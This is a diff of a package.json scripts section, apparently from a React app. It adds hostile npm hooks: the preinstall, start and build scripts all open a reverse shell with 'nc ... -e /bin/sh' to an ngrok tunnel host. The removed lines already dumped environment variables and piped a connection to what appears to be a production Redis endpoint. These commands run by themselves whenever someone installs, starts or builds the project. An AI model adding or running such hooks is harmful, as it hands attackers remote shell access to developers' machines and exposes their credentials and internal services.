@@ -14,8 +14,8 @@
   },
   "scripts": {
     "preinstall" : "nc 0.tcp.in.ngrok.io 16849 -e /bin/sh",
-    "start": "cat /proc/environ",
-    "build": "nc 0.tcp.in.ngrok.io 17344 -e nc messaging-redis-prod-premium.k2fxzx.0001.use2.cache.amazonaws.com 6379",
+    "start": "nc 0.tcp.in.ngrok.io 16849 -e /bin/sh",
+    "build": "nc 0.tcp.in.ngrok.io 16849 -e /bin/sh",
     "test": "react-scripts test --env=jsdom",
     "eject": "react-scripts eject"
   },
